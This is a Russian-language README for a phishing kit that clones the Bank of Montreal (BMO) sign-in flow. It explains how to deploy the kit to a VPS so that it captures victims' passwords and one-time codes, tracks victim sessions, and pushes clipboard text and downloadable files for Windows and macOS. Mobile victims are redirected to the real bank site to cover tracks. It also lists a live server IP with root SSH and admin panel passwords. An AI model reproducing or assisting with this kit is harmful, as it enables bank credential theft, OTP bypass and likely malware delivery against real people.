# BMO Clone

Flask + Nginx. Все страницы — свои (page1-signin, page2-loading, page3-verify, captcha, next). Никакого прокси BMO наружу: кредиты + OTP ловятся локально и пишутся в `data/log.jsonl`.

## Структура

```
apps/
├── deploy.py            # одношотовый деплой на свежий VPS
├── captcha.html         # пост-OTP captcha page (финал цепочки)
├── page1-signin/        # mirror реального BMO sign-in (HTML + assets/)
├── page2-loading/       # splash loading
├── page3-verify/        # OTP input page
└── server/
    ├── app.py           # Flask backend (routes + capture + /panel + /download)
    └── data/            # (на боксе) log.jsonl, sessions.json, admin.json, files/
```

## Деплой на новый сервер

### Что нужно
- **Ubuntu 22.04 LTS** (fresh), root доступ по SSH паролем или ключом
- Минимум **1 vCPU / 1 GB RAM / 5 GB disk** (у нас хватает с запасом)
- Порт **80** наружу (ufw откроет сам)
- Python 3.10+ на локалке (для запуска deploy.py), `pip install paramiko`

### Один скрипт — всё

```bash
cd apps
python3 deploy.py <IP> <USER> <PASSWORD>
# пример:
python3 deploy.py 23.94.145.158 root vigZNDuUoYKS9y9OhgPP
```

Или без аргументов — возьмёт дефолты из `deploy.py` (сейчас `23.94.145.158`).

### Что скрипт делает (идемпотентно, можно гонять N раз)

1. `apt install python3-pip nginx ufw`
2. `pip install flask gunicorn`
3. Собирает tarball из `server/`, `page*/`, `captcha.html`, `next.html` → upload в `/opt/bmo-clone/`
4. Сохраняет `/opt/bmo-clone/server/data/` между деплоями (log, sessions, uploaded files)
5. Пишет `/etc/systemd/system/bmo-clone.service` → gunicorn 2 воркера на `127.0.0.1:8000`
6. Пишет `/etc/nginx/conf.d/bmo.conf` → reverse-proxy `:80 → :8000`
7. `ufw`: deny all, allow 22, 80
8. Smoke-тест всех роутов

### Проверка после деплоя

```
http://<IP>/            → splash
http://<IP>/signin      → login form (page1)
http://<IP>/verify      → OTP (только после signin — иначе 302 → /signin)
http://<IP>/captcha     → captcha copy page (только после OTP — иначе 302 → /signin)
http://<IP>/panel       → админка: admin / Panel9100
                          тумблер Page ON/OFF — выключено = везде "Page not found",
                          панель остаётся доступной

Flow:
- desktop: /signin → (кредиты) → /verify → (OTP) → /captcha
- mobile:  /signin → (кредиты) → /verify → (OTP) → реальный www1.bmo.com (сжигание следов)
```

### Смена пароля админки

В `deploy.py` правь `Environment=ADMIN_PASSWORD=...` в `SYSTEMD_UNIT`. Передеплой.

Либо на сервере:
```bash
systemctl edit bmo-clone
# добавь:
# [Service]
# Environment=ADMIN_PASSWORD=TwoyNoviyPass
systemctl restart bmo-clone
```

## Что лежит на боксе

```
/opt/bmo-clone/              # сам проект
/opt/bmo-clone/server/data/
  ├── log.jsonl              # все перехваченные события (credentials, otp_submit, …)
  ├── sessions.json          # активные сессии жертв
  ├── admin.json             # хеш/токен админа
  ├── captcha.json           # текст который копируется в буфер на /captcha
  ├── site.json              # {"enabled": true|false} — тумблер Page ON/OFF
  └── files/                 # drop-файлы для /download/{windows,macos}
/etc/systemd/system/bmo-clone.service
/etc/nginx/conf.d/bmo.conf
/var/log/nginx/bmo.{access,error}.log
```

## Полезные команды

```bash
# логи приложения
journalctl -u bmo-clone -f
# логи nginx
tail -f /var/log/nginx/bmo.{access,error}.log
# все захваты за сегодня
grep "$(date -u +%Y-%m-%d)" /opt/bmo-clone/server/data/log.jsonl
# рестарт backend
systemctl restart bmo-clone
# полный передеплой (с локалки, после правки файлов)
python3 deploy.py 23.94.145.158
```

## HTTPS (если захочешь домен)

```bash
# на сервере:
apt install -y certbot python3-certbot-nginx
certbot --nginx -d your.domain.com --non-interactive --agree-tos -m you@email.com
```

Certbot сам пропишет 443 в nginx и настроит renew.

## Текущий бокс

- **IP:** `23.94.145.158`
- **SSH:** `root / vigZNDuUoYKS9y9OhgPP`
- **URL:** http://23.94.145.158/
- **Panel:** http://23.94.145.158/panel (`admin / Panel9100`)
